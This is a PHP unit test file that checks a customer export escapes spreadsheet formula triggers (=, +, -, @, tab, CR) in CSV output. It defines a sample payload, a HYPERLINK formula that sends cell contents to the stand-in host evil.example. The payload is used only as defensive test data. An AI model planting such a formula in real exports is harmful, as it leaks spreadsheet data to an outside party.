<?php

namespace Tests\Unit;

use App\Exports\CustomersExport;
use App\Models\Customer;
use Illuminate\Database\Eloquent\Builder;
use Mockery;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Csv;
use Tests\TestCase;

/**
 * Issue #898 (SALES-PLAT P2, PC4) — CSV formula injection.
 *
 * SalesDocumentExport::bindValue() forces string cells to be explicit strings,
 * which protects XLSX. The CSV writer reads the raw cell value, so a customer
 * name / line description / reference beginning with = + - @ TAB or CR runs as
 * a formula when the CSV is opened in Excel or Google Sheets.
 */
class Issue898CsvFormulaInjectionTest extends TestCase
{
    private const PAYLOAD = '=HYPERLINK("http://evil.example/collect?x="&A1,"Click me")';

    protected function tearDown(): void
    {
        Cell::setValueBinder(new DefaultValueBinder);

        parent::tearDown();
    }

    public function test_csv_output_neutralises_a_customer_name_starting_with_an_equals_formula(): void
    {
        $export = new CustomersExport(Mockery::mock(Builder::class), ['name'], 'csv');
        $customer = (new Customer)->forceFill(['name' => self::PAYLOAD]);

        $cells = $this->renderCsv($export, $export->map($customer));

        $this->assertSame(
            "'".self::PAYLOAD,
            $cells[0],
            'A customer name starting with "=" must be escaped so CSV consumers treat it as text.'
        );
    }

    public function test_csv_output_neutralises_every_spreadsheet_formula_trigger(): void
    {
        foreach (['=', '+', '-', '@', "\t"] as $trigger) {
            $name = $trigger.'SUM(1+1)';
            $export = new CustomersExport(Mockery::mock(Builder::class), ['name'], 'csv');
            $customer = (new Customer)->forceFill(['name' => $name]);

            $cells = $this->renderCsv($export, $export->map($customer));

            $this->assertSame(
                "'".$name,
                $cells[0],
                sprintf('A value starting with %s must be escaped in CSV.', json_encode($trigger))
            );
        }
    }

    /**
     * PhpSpreadsheet normalises a leading CR to LF inside a text cell
     * (`Cell::setValueExplicit` — verified against the installed vendor
     * version), so a CR can never survive verbatim into the CSV. What must
     * still hold is the security property: the value is prefixed with an
     * apostrophe, so a formula behind the CR cannot execute.
     */
    public function test_csv_output_neutralises_a_leading_carriage_return(): void
    {
        $export = new CustomersExport(Mockery::mock(Builder::class), ['name'], 'csv');
        $customer = (new Customer)->forceFill(['name' => "\r=SUM(1+1)"]);

        $cells = $this->renderCsv($export, $export->map($customer));

        $this->assertStringStartsWith(
            "'",
            (string) $cells[0],
            'A CR-leading value must still be prefixed so CSV consumers treat it as text, never as a formula.'
        );
    }

    public function test_csv_output_leaves_ordinary_text_and_numbers_untouched(): void
    {
        $export = new CustomersExport(Mockery::mock(Builder::class), ['name', 'credit_limit'], 'csv');
        $customer = (new Customer)->forceFill(['name' => 'Acme Hospital', 'credit_limit' => '1250.00']);

        $cells = $this->renderCsv($export, $export->map($customer));

        $this->assertSame('Acme Hospital', $cells[0]);
        $this->assertSame('1250', $cells[1]);
    }

    public function test_xlsx_binding_keeps_the_raw_value_as_an_explicit_string(): void
    {
        $export = new CustomersExport(Mockery::mock(Builder::class), ['name']);
        $spreadsheet = new Spreadsheet;

        Cell::setValueBinder($export);
        try {
            $sheet = $spreadsheet->getActiveSheet();
            $sheet->setCellValue('A1', self::PAYLOAD);

            $this->assertSame(self::PAYLOAD, $sheet->getCell('A1')->getValue(),
                'XLSX already protects formulas through explicit strings; the raw value must not be mangled.');
            $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('A1')->getDataType());
        } finally {
            Cell::setValueBinder(new DefaultValueBinder);
            $spreadsheet->disconnectWorksheets();
        }
    }

    /**
     * @param  array<int, mixed>  $row
     * @return array<int, string|null>
     */
    private function renderCsv(CustomersExport $export, array $row): array
    {
        $spreadsheet = new Spreadsheet;
        Cell::setValueBinder($export);

        try {
            $spreadsheet->getActiveSheet()->fromArray($row, null, 'A1');

            $path = tempnam(sys_get_temp_dir(), 'ace898_');
            try {
                (new Csv($spreadsheet))->save($path);
                $csv = (string) file_get_contents($path);
            } finally {
                @unlink($path);
            }
        } finally {
            Cell::setValueBinder(new DefaultValueBinder);
            $spreadsheet->disconnectWorksheets();
        }

        $lines = array_values(array_filter(explode("\n", trim($csv))));

        return str_getcsv($lines[0]);
    }
}
